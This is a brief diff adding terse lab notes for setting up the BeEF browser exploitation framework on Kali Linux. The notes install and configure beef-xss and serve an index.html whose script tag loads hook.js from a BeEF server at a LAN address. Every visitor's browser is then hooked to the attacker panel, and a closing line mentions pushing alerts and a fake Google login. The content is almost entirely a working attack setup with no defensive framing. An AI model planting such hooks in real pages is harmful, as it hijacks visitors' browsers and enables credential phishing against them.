@@ -1,0 +1,23 @@
+(kali)
+#apt-get install beef-xss -y
+# vim /etc/beef-xss/config.yaml
+Username and password
+# systemctl restart beef-xss.service
+#beef -xss
+(index.html)
+<html>
+
+<head>
+<script src="http://192.168.31.226:3000/hook.js"> 
+</script>	
+</head>
+
+<body>
+		hello world	
+	</body>
+</html>
+# systemctl restart apache2
+# systemctl restart beef-xss.service
+#(http://192.168.31.226/index.html)
+(http://127.0.0.1:3000/ui/panel)
+(alert and google phishing)
